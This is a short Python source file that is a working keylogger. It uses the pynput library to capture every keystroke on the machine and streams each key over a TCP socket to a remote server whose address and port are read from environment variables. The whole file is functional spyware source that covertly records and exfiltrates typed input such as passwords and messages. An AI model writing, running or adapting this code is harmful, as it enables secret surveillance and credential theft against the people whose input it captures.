import socket
import pynput
from pynput.keyboard import Listener
import os
from dotenv import load_dotenv

load_dotenv()

SERVER_IP = os.getenv("SERVER_IP")
SERVER_PORT = int(os.getenv("SERVER_PORT"))

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((SERVER_IP, SERVER_PORT))

def on_press(key):
    try:
        key_data = key.char
    except AttributeError:
        key_data = f" [{key}] "

    client.send(key_data.encode("utf-8"))

with Listener(on_press=on_press) as listener:
    listener.join()

client.close()
